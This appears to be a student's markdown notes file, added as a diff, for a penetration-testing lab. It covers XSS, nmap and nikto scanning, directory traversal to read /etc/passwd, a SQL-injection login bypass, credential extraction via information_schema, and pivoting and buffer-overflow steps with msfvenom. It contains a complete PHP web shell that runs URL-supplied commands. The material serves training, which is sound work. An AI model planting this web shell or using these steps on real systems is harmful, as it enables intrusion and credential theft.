@@ -1,0 +1,93 @@
+## Cross-Site Scripting (XSS)
+Reflected XSS
+Characters normally illegal can be base64 encoded to bypass
+Delievered through shit like email
+<script>alert("Hello")</script> can test for XSS
+Interactions with field forms are POST, interactions with the URL bar is GET
+
+Stored XSS
+Resides on vuln site
+Only requires user to visit page
+
+tomorrow you will be given a greyhost that will be your first pivot point. scan from this box
+key things for opnotes
+    - command used for scan
+    - results
+nmap -Pn -T4 --min-rate 80000 10.50.34.201 -p- == cracked 
+if you wanna specify certain ports
+    - 1-1024 
+    - 3389, 22, 80, 4242, 1111,2222,3333,4444,5555,6666,7777,8888,9999
+after scanning the first box and finding port 22 and port 80 open, enumerate the http service
+nikto -h <ip>
+    - specifically designed for websites , and sometimes finds things that nmap scans will not
+    - however nmap scan script == nmap -Pn <ip> --script=http-enum.nse -p 80
+nikto tends not to work for you so be careful. you can also nc the port to verify that a server exists 
+check every single directory that is given to you by nikto/nmap scripts 
+navigate to website
+    - take note of anything of interest on website
+    - we found a page on the website that gives us an input box with a "file to read"
+    - get careers page is vulnerable to directory traversal take note of its exact location
+    - attempt to view etc passwd and look for valid login shells
+    - attempt to view /etc/hosts to look for ip addresses for potential future boxes
+    - next step should be initial access 
+    - if there isnt an uploads page you probably cannot upload anything to it 
+    - when attempting to exploit a username/passwd field use "' or 1'=1"
+            - POST METHOD 
+     
+     web shell upload syntax if its gone.
+     ###############################################
+     <HTML><BODY>
+  <FORM METHOD="GET" NAME="myform" ACTION="">
+  <INPUT TYPE="text" NAME="cmd">
+  <INPUT TYPE="submit" VALUE="Send">
+  </FORM>
+  <pre>
+  <?php
+  if($_GET['cmd']) {
+    system($_GET['cmd']);
+    }
+  ?>
+  </pre>
+  </BODY></HTML>
+   ######################################################
+   - POST REQUEST 
+        - on the login.php
+        - click on post request, went to request, clicked on raw, copied test statement into url with an added questionmark
+   - annotate the process of how you did this and what you acquired from doing this.
+Login to web esrver box with credentials
+- verify hostname and user with - whoami - hostname 
+- sudo -l to determine what we can access, if there is nothing gg
+- navigate to /var/www/html and ls this directory, it will show everything on the website.
+- if you cant find a way to priv esc on a box, it probably wasnt meant to be done.
+- check /etc/hosts just in case 
+- find a new ip and a hostname 
+- scan the network that we find from the ip after making a dynamic tunnel.
+- navigate to web server of host discovered from previous box 
+Gain access to new web server page
+    - find sql injection vulnerable bubbles
+    - look at goldenstatement 
+    - information_schema.columns 
+      - look for custom made columns 
+      - site users == custom 
+      - exploit that shi 
+      - look for credentials, anything of value, document what syntax you used and what you found 
+ON WINDOWS BOX
+    - ALWAYS CHECK SERVICES FIRST 
+BUFFER OVERFLOW
+CHECK SERVICES FIRST LOOK FOR A BLANK DESCRITPION 
+- SET A TUNNEL TO BOTH RDP AND 9999 PORTS 
+- USE A RANDOM HIGH PORT FOR MSFVENOM COMMAND, USE THE SAME ONE FOR THE MSFCONSOLE
+- USE MULTIHANDLER 
+- USE THE RHP FOR THE TUNNEL TO 9999 FOR THE SOCKET SCRIPT
+- LAUNCH EXE ON BOX
+
+ssh key gen 
+        
+1. Generate our SSH KEYS
+          - on whichever host you plan on loggin in from, generate keys
+          - ssh-keygen -t rsa -b 4096
+          - use default, and overwrite
+          - do not put password. double enter
+          - /home/student/.ssh/id_rsa == directory for ssh key
+          - /home/student/.ssh/id_rsa.pub == public key
+ -ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDIqBpxO52RJ2QIXdkX8/s494usXeD3/oUhL8TpyVCemiUCIbdKHtT2kyfl1iK21Bh3hOPR4X8n6pRwSOaH2Z9l5h3tOzWwHo1hLC50ECfgveWtPoGDqh+/ex/5B+0TnIVKtVpvbSiuakdCLC9LLza9vfpg4oZ2IpjD/Q3AKs7OvTYm/g9nTtUw7vsGbR9qODmaG5QkrYoKxsiBgmg3fgQlBtSQYpQfZQ1/HG7hkenUc8Jtj3KcMi1+zuIJXugINIz1SuHp6LW0mSG654yNh3SoiL1ydZGxpfuefye+PZ7WFBJjSfjvBdeBhysNICkg/19q8NXXJSgwzUzMpiF9Z4XsMugha9kFpWleTiF47LOUJbPhqncbUkH5JXthrGt0xWNugsjypTD02te/5g4yvM04duI8jtol3Aagkm7sS2BGU82i0h6KwHfvcmGJVVNcFZJNL8JQFlMGCCjS+KOPfb7HKVXyCKVWzuQHWLKW75KFjArRN+26vakXTapPgWEzdc2Gm8ubmUdNW5621NhRuRZ6NIJAMMlOPfxLC/TrakysGh3u6xkm9V7ucdFVeVt4E47Oj+/18exzKGZknR0uL7HKVncs1VVLWxuf2BEuQRYFXtZXRVCH+J9S4uS7WL9+DrVDhxL0zg1MKBdG2ekIyoxgIAUi81xFYF9w2nR3BijUEQ== student@lin-ops
